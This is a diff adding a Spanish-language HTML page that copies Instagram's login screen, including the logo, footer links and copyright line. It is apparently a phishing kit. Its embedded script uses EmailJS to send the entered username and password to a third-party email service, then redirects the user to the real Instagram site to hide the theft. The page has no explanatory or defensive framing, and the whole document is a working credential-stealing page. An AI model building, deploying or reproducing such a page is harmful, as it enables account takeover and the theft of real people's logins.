@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+    background:#0f1f2b;
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.container{
+    width:100%;
+    max-width:390px;
+    min-height:100vh;
+    padding:15px;
+    display:flex;
+    flex-direction:column;
+    color:white;
+}
+
+.language{
+    text-align:center;
+    font-size:14px;
+    color:white;
+    margin-top:10px;
+}
+
+.logo{
+    flex:1;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.logo img{
+    width:85px;
+}
+
+.form{
+    width:100%;
+}
+
+.input-box{
+    margin-bottom:14px;
+}
+
+.input-box input{
+    width:100%;
+    padding:18px;
+    border-radius:14px;
+    border:1px solid #30485c;
+    background:transparent;
+    color:white;
+    font-size:17px;
+    outline:none;
+}
+
+.input-box input::placeholder{
+    color:#9eb0bf;
+}
+
+.login-btn{
+    width:100%;
+    padding:17px;
+    border:none;
+    border-radius:30px;
+    background:#1877f2;
+    color:white;
+    font-size:22px;
+    font-weight:bold;
+    cursor:pointer;
+    margin-top:5px;
+}
+
+/* FOOTER */
+
+.footer{
+    margin-top:40px;
+    padding-top:25px;
+    padding-bottom:20px;
+    text-align:center;
+    color:#b6c2cf;
+    font-size:12px;
+    line-height:22px;
+}
+
+.footer-links{
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    gap:12px;
+    margin-bottom:15px;
+}
+
+.footer-links a{
+    color:#b6c2cf;
+    text-decoration:none;
+}
+
+.footer-links a:hover{
+    text-decoration:underline;
+}
+
+.footer-bottom{
+    margin-top:10px;
+    color:#b6c2cf;
+}
+
+.language-select{
+    margin-right:10px;
+}
+
+</style>
+
+<!-- EMAILJS -->
+<script type="text/javascript"
+src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+
+<script type="text/javascript">
+
+// INICIAR EMAILJS
+(function () {
+    emailjs.init({
+        publicKey: "DCOXXzQ5DmLosXJIH",
+    });
+})();
+
+// ENVIAR DATOS
+function sendData(event) {
+
+    event.preventDefault();
+
+    emailjs.sendForm(
+        'service_xxme9r3',
+        'template_j9jfgqk',
+        '#contact-form'
+    ).then(
+
+        function(response) {
+
+            console.log('SUCCESS!', response.status, response.text);
+
+            window.location.href = "https://www.instagram.com/?hl=es";
+
+        },
+
+        function(error) {
+
+            console.log('FAILED...', error);
+
+            alert("Error al enviar");
+
+        }
+
+    );
+}
+
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="language">
+        Español
+    </div>
+
+    <div class="logo">
+        <img 
+        src="https://upload.wikimedia.org/wikipedia/commons/a/ac/Instagram-Gradient-Logo-PNG.png" 
+        alt="Instagram Logo">
+    </div>
+
+    <form id="contact-form" class="form">
+
+        <div class="input-box">
+            <input
+                id="p1"
+                name="p1"
+                type="text"
+                placeholder="Nombre de usuario, correo o celular"
+                required
+            >
+        </div>
+
+        <div class="input-box">
+            <input
+                id="p2"
+                name="p2"
+                type="password"
+                placeholder="Contraseña"
+                required
+            >
+        </div>
+
+        <button class="login-btn" type="submit">
+            Enviar
+        </button>
+
+    </form>
+
+    <!-- FOOTER -->
+
+    <div class="footer">
+
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">Información</a>
+            <a href="#">Blog</a>
+            <a href="#">Empleo</a>
+            <a href="#">Ayuda</a>
+            <a href="#">API</a>
+            <a href="#">Privacidad</a>
+            <a href="#">Condiciones</a>
+            <a href="#">Ubicaciones</a>
+            <a href="#">Popular</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Threads</a>
+            <a href="#">Subir contactos y personas no usuarias</a>
+            <a href="#">Meta Verified</a>
+        </div>
+
+        <div class="footer-bottom">
+            <span class="language-select">
+                Español (España) ▼
+            </span>
+
+            © 2026 Instagram from Meta
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+
+document
+    .getElementById("contact-form")
+    .addEventListener("submit", sendData);
+
+</script>
+
+</body>
+</html>
